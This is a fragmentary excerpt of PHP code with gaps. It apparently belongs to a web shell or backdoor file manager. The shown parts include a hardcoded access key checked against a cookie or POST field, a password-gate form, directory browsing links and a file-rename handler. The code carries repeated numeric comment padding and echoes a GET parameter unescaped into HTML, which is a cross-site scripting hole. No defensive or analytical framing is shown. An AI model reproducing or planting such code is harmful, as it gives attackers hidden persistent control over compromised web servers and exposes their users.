...
$auth_key = "a3a3e2623f3a65904569b2c40c378222";
...
$pass = false;
if (isset($_COOKIE['pw_name_25637'])) {
    if(($_COOKIE['pw_name_25637']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_25637'])) {
        if(($_POST['pw_name_25637']) == $auth_key) {
            setcookie("pw_name_25637", $_POST['pw_name_25637']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_25637' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726292952860692 1726292952937406 1726292952937611 1726292952853633
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726292952860692 1726292952937406 1726292952937611 1726292952853633
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726292952860692 1726292952937406 1726292952937611 1726292952853633
            $name = PATH . "/" . $_GET['r'];
